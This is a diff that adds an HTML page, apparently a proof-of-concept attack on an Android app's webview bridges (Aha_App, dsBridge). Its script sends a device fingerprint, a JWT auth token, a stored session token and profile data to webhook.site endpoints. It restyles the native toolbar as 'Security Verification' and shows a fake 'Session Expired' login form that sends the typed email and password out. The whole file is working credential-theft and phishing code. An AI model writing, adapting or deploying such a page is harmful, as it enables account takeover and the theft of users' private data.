@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login: Required</title>
+  <script>
+(function () {
+  const webhook = "https://37818315-37ff-4e6c-8353-cd3a38124ea3.webhook.site";
+
+  // ── 1. Exfiltrate device fingerprint via Aha_App bridge ──
+  if (window.Aha_App) {
+    try {
+      const info = window.Aha_App.getBaseInfo();
+      fetch(webhook, {
+        method: "POST",
+        body: JSON.stringify({ type: "deviceInfo", info })
+      });
+    } catch (e) {}
+
+    // ── 2. Manipulate native UI to look like a real login screen ──
+    try {
+      window.Aha_App.setToolbarTitle("Security Verification");
+      window.Aha_App.setToolbarColor("#1a1a1a");
+      window.Aha_App.setStatusBarColor("#1a1a1a");
+      window.Aha_App.showToolbar();
+    } catch (e) {}
+  }
+
+  // ── 3. Steal JWT auth token via Auth2Bridge ──
+  // (Requires dsBridge or BridgeChannel client-side library)
+  if (window.dsBridge) {
+    try {
+      dsBridge.call("/auth/authCode", { appId: "net.bat.store" }, function(res) {
+        fetch(webhook, {
+          method: "POST",
+          body: JSON.stringify({ type: "jwt", token: res })
+        });
+      });
+    } catch (e) {}
+
+    // ── 4. Read arbitrary MMKV storage namespaces ──
+    try {
+      dsBridge.call("/storage/getPlus", { flag: "user_session", key: "token" }, function(val) {
+        fetch(webhook, {
+          method: "POST",
+          body: JSON.stringify({ type: "storage_user_session_token", value: val })
+        });
+      });
+    } catch (e) {}
+
+    // ── 5. Exfiltrate user PII via BaseInfoBridge ──
+    try {
+      dsBridge.call("/business/basicInfo", { request: ["avatar","nickname","gender"] }, function(info) {
+        fetch(webhook, {
+          method: "POST",
+          body: JSON.stringify({ type: "userPII", info })
+        });
+      });
+    } catch (e) {}
+  }
+})();
+  </script>
+</head>
+<body style="background:#1a1a1a;color:#fff;font-family:sans-serif;padding:30px;">
+  <h2 style="color:#fff;">⚠️ Session Expired</h2>
+  <p>Please re-enter your credentials to continue.</p>
+  <form onsubmit="
+    event.preventDefault();
+    fetch('https://webhook.site/c6fe043d-935e-425e-9a4a-92c21e91f1a0'
+      + '?email=' + encodeURIComponent(this.email.value)
+      + '&password=' + encodeURIComponent(this.password.value)
+      + '&ts=' + Date.now());
+  ">
+    <input name="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;"><br>
+    <input name="password" type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;"><br>
+    <button type="submit" style="width:100%;padding:12px;background:#e53935;color:#fff;border:none;font-size:16px;">
+      Continue
+    </button>
+  </form>
+</body>
+</html>
